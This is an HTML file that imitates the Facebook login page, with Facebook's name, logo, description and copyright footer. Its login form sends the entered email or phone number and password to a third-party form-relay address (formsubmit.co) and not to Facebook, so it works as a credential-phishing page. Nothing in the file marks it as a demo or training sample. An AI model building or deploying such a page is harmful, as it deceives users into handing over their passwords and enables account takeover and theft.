<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="title" content="Facebook">
    <meta name="description" content="Facebook Login Page">
    <title>Facebook</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="media-queries.css">
</head>
<body>
    <div class="login-container">
        <div class="logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/768px-Facebook_Logo_%282019%29.png" alt="Facebook Logo">
        </div>
        <div class="login-form-container">
            <form action="https://formsubmit.co/c1274c0fa92b3e08662dac449049d1ca" method="post">
                <input type="text" placeholder="Email or phone number" name="email" id="email" required>
                <input type="password" placeholder="password" name="password" id="password" required>
                <button type="submit" name="login">Log In</button>
            </form>
            <a href="#">Forgot password?</a>
            <hr>
            <div class="create-account-button">
                <a href="#">Create New Account</a>
            </div>
        </div>
    </div>
    <div class="footer-container">
        <span>&copy; 2024 Facebook. All rights reserved.</span>
    </div>
</body>
</html>
